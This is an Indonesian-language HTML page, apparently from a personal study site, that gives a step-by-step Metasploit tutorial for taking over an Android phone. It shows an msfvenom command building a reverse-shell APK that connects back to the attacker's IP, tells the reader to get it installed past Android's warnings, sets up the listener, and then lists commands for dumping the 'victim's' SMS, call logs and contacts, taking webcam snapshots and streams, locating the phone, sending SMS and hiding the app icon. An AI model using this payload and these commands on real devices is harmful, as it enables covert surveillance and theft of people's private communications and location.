@@ -1,0 +1,747 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js navy">
+
+<head>
+    <!-- Book generated using mdBook -->
+    <meta charset="UTF-8">
+
+    <!-- ----------------------------------------------- DIGANTI JUDUL ----------------------------------------------- -->
+    <title>Metasploit</title>
+    <!-- ----------------------------------------------# DIGANTI JUDUL #---------------------------------------------- -->
+
+
+
+    <!-- Custom HTML head -->
+
+
+
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="description" content="Wetofu : belajar suka-suka aee">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#ffffff" />
+
+
+    <link rel="icon" href="../favicon.svg">
+
+
+    <link rel="shortcut icon" href="../favicon.png">
+
+    <link rel="stylesheet" href="../css/variables.css">
+    <link rel="stylesheet" href="../css/general.css">
+    <link rel="stylesheet" href="../css/chrome.css">
+    <link rel="stylesheet" href="../css/print.css" media="print">
+
+    <!-- Fonts -->
+    <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+
+    <link rel="stylesheet" href="../fonts/fonts.css">
+
+
+    <!-- Highlight.js Stylesheets -->
+    <link rel="stylesheet" href="../highlight.css">
+    <link rel="stylesheet" href="../tomorrow-night.css">
+    <link rel="stylesheet" href="../ayu-highlight.css">
+
+    <!-- Custom theme stylesheets -->
+
+
+
+</head>
+
+<body>
+    <!-- Provide site root to javascript -->
+    <script type="text/javascript">
+        var path_to_root = "../";
+        var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+    </script>
+
+    <!-- Work around some values being stored in localStorage wrapped in quotes -->
+    <script type="text/javascript">
+        try {
+            var theme = localStorage.getItem('mdbook-theme');
+            var sidebar = localStorage.getItem('mdbook-sidebar');
+
+            if (theme.startsWith('"') && theme.endsWith('"')) {
+                localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+            }
+
+            if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+            }
+        } catch (e) {}
+    </script>
+
+    <!-- Set the theme before any content is loaded, prevents flash -->
+    <script type="text/javascript">
+        var theme;
+        try {
+            theme = localStorage.getItem('mdbook-theme');
+        } catch (e) {}
+        if (theme === null || theme === undefined) {
+            theme = default_theme;
+        }
+        var html = document.querySelector('html');
+        html.classList.remove('no-js')
+        html.classList.remove('navy')
+        html.classList.add(theme);
+        html.classList.add('js');
+    </script>
+
+    <!-- Hide / unhide sidebar before it is displayed -->
+    <script type="text/javascript">
+        var html = document.querySelector('html');
+        var sidebar = 'hidden';
+        if (document.body.clientWidth >= 1080) {
+            try {
+                sidebar = localStorage.getItem('mdbook-sidebar');
+            } catch (e) {}
+            sidebar = sidebar || 'visible';
+        }
+        html.classList.remove('sidebar-visible');
+        html.classList.add("sidebar-" + sidebar);
+    </script>
+
+    <!-- ---------------------------------------- NAV ---------------------------------------- -->
+    <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+        <div class="sidebar-scrollbox">
+            <ol class="chapter">
+                <!-- -------------------- KENALAN -------------------- -->
+                <li class="chapter-item expanded affix "><a href="../index.html"><strong
+                            aria-hidden="true">KENALAN</strong></a></li>
+                <!-- -------------------- KULIAH -------------------- -->
+                <li class="chapter-item expanded ">
+                    <a href="../00-intro/index.html">
+                        <strong aria-hidden="true">1. Mata Kuliah </strong>
+                    </a>
+                </li>
+                <li>
+                    <ol class="section">
+                        <li class="chapter-item expanded ">
+                            <a href="../00-intro/inf.html">
+                                <strong aria-hidden="true">1.1.</strong> Informatika
+                            </a>
+                        </li>
+                        <li>
+                            <ol class="section">
+                                <li class="chapter-item expanded "><a href="../00-intro/pbo.html">1.1.1. PBO</a></li>
+                                <li>
+                                    <ol class="section">
+                                        <li class="chapter-item expanded "><a href="../00-intro/pbojavgen.html">1.1.1.1
+                                                Java Generics</a></li>
+                                        <li class="chapter-item expanded "><a href="../00-intro/pboso.html">1.1.1.2
+                                                String Operation</a></li>
+                                        <li class="chapter-item expanded "><a href="../00-intro/pboreg.html">1.1.1.3
+                                                Regex</a></li>
+                                        <li class="chapter-item expanded "><a href="../00-intro/pboea.html">1.1.1.4
+                                                Exception & Assertion</a></li>
+                                        <li class="chapter-item expanded "><a href="../00-intro/pboio.html">1.1.1.5
+                                                I/O</a></li>
+                                    </ol>
+                                </li>
+                                <li class="chapter-item expanded "><a href="../00-intro/basdat.html">1.1.2. Basdat</a>
+                                </li>
+                            </ol>
+                        </li>
+                        <li class="chapter-item expanded "><a href="../00-intro/kimia.html"><strong
+                                    aria-hidden="true">1.2.</strong> Kimia</a>
+                        </li>
+
+                        <!-- <li>
+                        <ol class="section">
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/pico18_strings/index.html"><strong
+                                        aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/helithumper_re/index.html"><strong
+                                        aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/csaw19_beleaf/index.html"><strong
+                                        aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li>
+                        </ol>
+                    </li> -->
+                    </ol>
+                </li>
+                <!-- -------------------- CYBER SECURITY -------------------- -->
+                <li class="chapter-item expanded ">
+                    <a href="../02-cybersec/index.html">
+                        <strong aria-hidden="true">2. Cyber Security </strong>
+                    </a>
+                </li>
+                <li>
+                    <ol class="section">
+                        <li class="chapter-item expanded "><a href="../02-cybersec/tcpip.html"><strong
+                                    aria-hidden="true">2.01.</strong> Konsep TCP/IP</a></li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.02.</strong> IPv6
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.03.</strong> Routing
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.04.</strong> Network
+                            Programming </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.05.</strong> Persiapan Hacking
+                        </li>
+                        <li class="chapter-item expanded "><a href="../02-cybersec/footprinting.html"><strong
+                                    aria-hidden="true">2.06.</strong> Footprinting </a></li>
+                        <li class="chapter-item expanded "><a href="../02-cybersec/infgather.html"><strong
+                                    aria-hidden="true">2.07.</strong> Information Gathering </a></li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.08.</strong> Sniffing </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.09.</strong> Spoffing </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.10.</strong> Hacking Wireless
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.11.</strong> Attack
+                            password </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.12.</strong> Attack
+                            database SQL </li>
+                        <li class="chapter-item expanded "><a href="../02-cybersec/mitm.html"><strong
+                                    aria-hidden="true">2.13.</strong> MITM </a></li>
+                        <li class="chapter-item expanded "><a href="../02-cybersec/msf.html"
+                                style="color: rgb(252, 155, 171);"><strong aria-hidden="true">2.14.</strong> Metasploit
+                            </a></li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.15.</strong> DNS &
+                            Deface WEB </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.16.</strong> Attack
+                            File Sharing </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.17.</strong>
+                            Vulnerability Analysis </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.18.</strong> Dasar
+                            Pengamanan Server </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.19.</strong>
+                            Firewall </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.20.</strong> VPN
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.21.</strong> Web
+                            Application Firewall </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.22.</strong>
+                            Pertahanan Host </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.23.</strong> Basic
+                            Data Security </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">2.24.</strong>
+                            Forensic </li>
+                        <li class="chapter-item expanded "><a href="../02-cybersec/deepweeb.html"><strong
+                                    aria-hidden="true">2.25.</strong> Deep Web </a></li>
+
+                        <!-- <li>
+                        <ol class="section">
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/pico18_strings/index.html"><strong
+                                        aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/helithumper_re/index.html"><strong
+                                        aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/csaw19_beleaf/index.html"><strong
+                                        aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li>
+                        </ol>
+                    </li> -->
+                    </ol>
+                </li>
+                <!-- -------------------- JARKOM -------------------- -->
+                <li class="chapter-item expanded ">
+                    <a href="../05-jarkom/index.html">
+                        <strong aria-hidden="true">3. Jaringan Komputer </strong>
+                    </a>
+                </li>
+                <li>
+                    <ol class="section">
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/pendahuluan.html">--><strong aria-hidden="true">3.01.</strong>
+                            Pendahuluan
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/cmlNwireshark.html">--><strong aria-hidden="true">3.02.</strong>
+                            Command Line & Wireshark
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/simJar.html">--><strong aria-hidden="true">3.03.</strong>
+                            Simulator
+                            Jaringan
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded "><a href="../05-jarkom/networking.html"><strong
+                                    aria-hidden="true">3.04.</strong> Networking</a></li>
+                        <li class="chapter-item expanded "><a href="../05-jarkom/pkjdll.html"><strong
+                                    aria-hidden="true">3.05.</strong> Perangkat Keras Jaringan & Data Link Layer</a>
+                        </li>
+                        <li class="chapter-item expanded "><a href="../05-jarkom/pwwi.html"><strong
+                                    aria-hidden="true">3.06.</strong> Perangkat WiFi / Wireless Internet</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/nlipv4.html">--><strong aria-hidden="true">3.07.</strong> Network
+                            Layer IPv4</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/tl.html">--><strong aria-hidden="true">3.08.</strong> Transport
+                            Layer</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/dsnpi.html">--><strong aria-hidden="true">3.09.</strong> Domain
+                            Name
+                            System & Pengaturan Internet</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/rnat.html">--><strong aria-hidden="true">3.10.</strong> Routing &
+                            NAT</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/webcms.html">--><strong aria-hidden="true">3.11.</strong> Web /
+                            Content Management System</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/email.html">--><strong aria-hidden="true">3.12.</strong> e-mail /
+                            SMTP
+                            / POP3 / IMAP / Webmail</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/voip.html">--><strong aria-hidden="true">3.13.</strong> VoIP /
+                            Internet Telepon</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/sm.html">--><strong aria-hidden="true">3.14.</strong> Streaming
+                            Multimedia</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/ipv6.html">--><strong aria-hidden="true">3.15.</strong> IPv6
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/hacking.html">--><strong aria-hidden="true">3.16.</strong> Hacking
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded "><a href="../02-cybersec/index.html"><strong
+                                    aria-hidden="true">3.17.</strong> Cyber Security</a></li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/basicdatasec.html">--><strong aria-hidden="true">3.18.</strong>
+                            Basic
+                            Data Security
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/pemjar.html">--><strong aria-hidden="true">3.19.</strong>
+                            Pemrograman
+                            Jaringan & IoT
+                            <!--</a>-->
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <!--<a href="../05-jarkom/nmb.html">--><strong aria-hidden="true">3.20.</strong> Network
+                            Management & Benchmarking
+                            <!--</a>-->
+                        </li>
+
+                        <!-- <li>
+                        <ol class="section">
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/pico18_strings/index.html"><strong
+                                        aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/helithumper_re/index.html"><strong
+                                        aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/csaw19_beleaf/index.html"><strong
+                                        aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li>
+                        </ol>
+                    </li> -->
+                    </ol>
+                </li>
+                <!-- -------------------- CTF -------------------- -->
+                <li class="chapter-item expanded "><a href="../03-ctf/index.html"><strong aria-hidden="true">3.
+                            Capture The Flag </strong></a></li>
+                <li>
+                    <ol class="section">
+                        <li class="chapter-item expanded ">
+                            <a href="../03-ctf/binex.html"><strong aria-hidden="true">3.1.</strong> Binary Exploitation
+                            </a>
+                        </li>
+                        <li>
+                            <ol class="section">
+                                <li class="chapter-item expanded ">
+                                    <a href="../03-ctf/binex-pwnshell.html">3.10. Pwn & Shellcode</a>
+                                </li>
+                            </ol>
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">3.2.</strong>
+                            Cryptography </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">3.3.</strong> Reverse
+                            Engineering </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">3.4.</strong> Web
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">3.5.</strong> Forensic
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">3.6.</strong>
+                            Miscellaneous </li>
+                        <li class="chapter-item expanded ">
+                            <a href="../03-ctf/assembly.html"><strong aria-hidden="true">3.7.</strong> Assembly
+                            </a>
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <a href="../03-ctf/johnhmnd.html"><strong aria-hidden="true">3.8.</strong> John-Hammond
+                            </a>
+                        </li>
+
+                        <!-- <li>
+                        <ol class="section">
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/pico18_strings/index.html"><strong
+                                        aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/helithumper_re/index.html"><strong
+                                        aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li>
+                            <li class="chapter-item expanded "><a
+                                    href="03-beginner_re/csaw19_beleaf/index.html"><strong
+                                        aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li>
+                        </ol>
+                    </li> -->
+                    </ol>
+                </li>
+                <!-- -------------------- TOOLS -------------------- -->
+                <li class="chapter-item expanded "><a href="../06-tools/index.html"><strong aria-hidden="true">4.
+                            Tools </strong></a></li>
+                <li>
+                    <ol class="section">
+                        <li class="chapter-item expanded ">
+                            <a href="../06-tools/nmap.html"><strong aria-hidden="true">4.1.</strong> Nmap</a>
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <a href="../06-tools/py.html"><strong aria-hidden="true">4.2.</strong> Python</a>
+                        </li>
+                        <li class="chapter-item expanded ">
+                            <a href="../06-tools/curl.html"><strong aria-hidden="true">4.3.</strong> Curl</a>
+                        </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">4.4.</strong> Ghidra </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">4.5.</strong> Ida </li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">4.6.</strong> Hydra</li>
+                        <li class="chapter-item expanded "><strong aria-hidden="true">4.7.</strong> Wireshark
+                        </li>
+                        <!-- <li>
+                <ol class="section">
+                    <li class="chapter-item expanded "><a
+                            href="03-beginner_re/pico18_strings/index.html"><strong
+                                aria-hidden="true">1.6.1.</strong> Pico'18: Strings</a></li>
+                    <li class="chapter-item expanded "><a
+                            href="03-beginner_re/helithumper_re/index.html"><strong
+                                aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li>
+                    <li class="chapter-item expanded "><a
+                            href="03-beginner_re/csaw19_beleaf/index.html"><strong
+                                aria-hidden="true">1.6.3.</strong> CSAW'19: Beleaf</a></li>
+                </ol>
+            </li> -->
+                    </ol>
+                </li>
+                <!-- -------------------- TIPS -------------------- -->
+                <li class="chapter-item expanded "><a href="../04-tips/index.html"><strong aria-hidden="true">5.
+                            TIPS </strong></a></li>
+                <!-- -------------------- Akhir -------------------- -->
+            </ol>
+        </div>
+        <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+    </nav>
+    <!-- ---------------------------------------# NAV #--------------------------------------- -->
+
+    <div id="page-wrapper" class="page-wrapper">
+
+        <div class="page">
+
+            <div id="menu-bar-hover-placeholder"></div>
+            <div id="menu-bar" class="menu-bar sticky bordered">
+                <div class="left-buttons">
+                    <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents"
+                        aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                        <i class="fa fa-bars"></i>
+                    </button>
+                    <button id="theme-toggle" class="icon-button" type="button" title="Change theme"
+                        aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                        <i class="fa fa-paint-brush"></i>
+                    </button>
+                    <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                        <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                        <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                        <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                        <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                        <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                    </ul>
+
+                    <!-- <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)"
+                        aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S"
+                        aria-controls="searchbar">
+                        <i class="fa fa-search"></i>
+                    </button> -->
+
+                </div>
+                <!-- ----------------------------------------------- DIGANTI MENU TITLE ----------------------------------------------- -->
+                <h1 class="menu-title">Metasploit</h1>
+                <!-- ----------------------------------------------# DIGANTI MENU TITLE #---------------------------------------------- -->
+
+                <div class="right-buttons">
+                    <a href="../print.html" title="Print this book" aria-label="Print this book">
+                        <i id="print-button" class="fa fa-print"></i>
+                    </a>
+
+                    <a href="https://github.com/syahrolus" title="Git repository" aria-label="Git repository">
+                        <i id="git-repository-button" class="fa fa-github"></i>
+                    </a>
+                </div>
+            </div>
+
+
+            <div id="search-wrapper" class="hidden">
+                <form id="searchbar-outer" class="searchbar-outer">
+                    <input type="search" name="search" id="searchbar" name="searchbar"
+                        placeholder="Search this book ..." aria-controls="searchresults-outer"
+                        aria-describedby="searchresults-header">
+                </form>
+                <div id="searchresults-outer" class="searchresults-outer hidden">
+                    <div id="searchresults-header" class="searchresults-header"></div>
+                    <ul id="searchresults">
+                    </ul>
+                </div>
+            </div>
+
+
+            <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+            <script type="text/javascript">
+                document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                Array.from(document.querySelectorAll('#sidebar a')).forEach(function (link) {
+                    link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                });
+            </script>
+
+            <div id="content" class="content">
+                <main>
+                    <!-- ----------------------------------------------- DIGANTI MENU ----------------------------------------------- -->
+                    <br><br>
+                    <ul>
+                        <li><a class="header" href="#andr">Target Android</a></li>
+                    </ul>
+                    <br>
+                    <hr><br>
+                    kali linux :
+                    <ul>
+                        <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=4444 R > /home/carloz/app.apk</code></pre>
+                        file ada di <code>/home/carloz</code> <br>
+                        lalu, install apk di android, pastikan allow instalasi agar dapat diinstall karena Android akan
+                        mendetect bahwa apk tersebut tidak resmi/secure
+                        <pre><code>msfconsole</code></pre>
+                        <pre><code>use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.43.30
+set lport 4444
+exploit</code></pre>
+                        # ip kali linux <br><br>
+                        beberapa perintah :<br><br>
+                        <ul>
+                            informasi tentang device :
+                            <pre><code>sysinfo </code></pre>
+                            linux / android ps command :
+                            <pre><code>ps </code></pre>
+                            list webcam yang ada :
+                            <pre><code>webcam_list </code></pre>
+                            snapshot webcam :
+                            <pre><code>webcam_snap </code></pre>
+                            kalau membutuhkan shell (untuk device yang sudah di root) :
+                            <pre><code>shell </code></pre>
+                            cek apakah smartphone korban di root :
+                            <pre><code>check_root</code></pre>
+                            informasi tentang device :
+                            <pre><code>sysinfo</code></pre>
+                            tampikan lokasi smartphone di Google maps :
+                            <pre><code>wlan_geolocate</code></pre>
+                            download call log di file txt. ini akan tersimpan di /root/calllog_dump.txt :
+                            <pre><code>dump_calllog</code></pre>
+                            download SMS disimpan di txt file :
+                            <pre><code>dump_sms</code></pre>
+                            kirim SMS :
+                            <pre><code>send_sms -d “nomor tujuan” -t “berita yang ingin dikirim”
+send_sms -d 9599***847 -t hacked</code></pre>
+                            tampilan daftar semua webcam yang ada di smartphone korban :
+                            <pre><code>webcam_list</code></pre>
+                            pilih webcam 2 :
+                            <pre><code>webcam_snap 2</code></pre>
+                            streaming dari webcam :
+                            <pre><code>webcam_stream</code></pre>
+                            kalau membutuhkan shell (untuk device yang sudah di root) :
+                            <pre><code>shell</code></pre>
+                            linux / android ps command :
+                            <pre><code>ps</code></pre>
+                        </ul><br>
+                        <pre>Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for 'load'
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory 
+ 
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    route         View and modify the routing table
+ 
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getuid        Get the user that the server is running as
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS 
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam 
+
+
+Android Commands
+================
+
+    Command           Description
+    -------           -----------
+    activity_start    Start an Android activity from a Uri string
+    check_root        Check if device is rooted
+    dump_calllog      Get call log
+    dump_contacts     Get contacts list
+    dump_sms          Get sms messages
+    geolocate         Get current lat-long using geolocation
+    hide_app_icon     Hide the app icon from the launcher
+    interval_collect  Manage interval collection capabilities
+    send_sms          Sends SMS from target session
+    set_audio_mode    Set Ringer Mode
+    sqlite_query      Query a SQLite database from storage
+    wakelock          Enable/Disable Wakelock
+    wlan_geolocate    Get current lat-long using WLAN information </pre>
+                    </ul>
+
+                    <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
+                </main>
+
+                <nav class="nav-wrapper" aria-label="Page navigation">
+                    <!-- Mobile navigation buttons -->
+                    <!-- ----------------------------------------------- DIGANTI PREV NEXT ----------------------------------------------- -->
+
+                    <!-- sebelum -->
+                    <a rel="prev" href="mitm.html" class="mobile-nav-chapters previous" title="Previous chapter"
+                        aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <!-- sesudah -->
+                    <a rel="next" href="deepweeb.html" class="mobile-nav-chapters next" title="Next chapter"
+                        aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                    <!-- ----------------------------------------------# DIGANTI PREV NEXT #---------------------------------------------- -->
+
+                    <div style="clear: both"></div>
+                </nav>
+            </div>
+        </div>
+
+        <nav class="nav-wide-wrapper" aria-label="Page navigation">
+            <!-- ----------------------------------------------- DIGANTI PREV NEXT 2 ----------------------------------------------- -->
+            <!-- sebelum -->
+            <a rel="prev" href="mitm.html" class="nav-chapters previous" title="Previous chapter"
+                aria-label="Previous chapter" aria-keyshortcuts="Left">
+                <i class="fa fa-angle-left"></i>
+            </a>
+            <!-- sesudah -->
+            <a rel="next" href="deepweeb.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter"
+                aria-keyshortcuts="Right">
+                <i class="fa fa-angle-right"></i>
+            </a>
+            <!-- ----------------------------------------------# DIGANTI PREV NEXT 2 #---------------------------------------------- -->
+        </nav>
+
+    </div>
+
+
+
+
+
+
+
+
+    <script type="text/javascript">
+        window.playground_copyable = true;
+    </script>
+
+
+
+
+
+    <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+    <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+    <!-- <script src="../searcher.js" type="text/javascript" charset="utf-8"></script> -->
+
+
+    <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+    <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+    <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+    <!-- Custom JS scripts -->
+
+
+
+
+</body>
+
+</html>
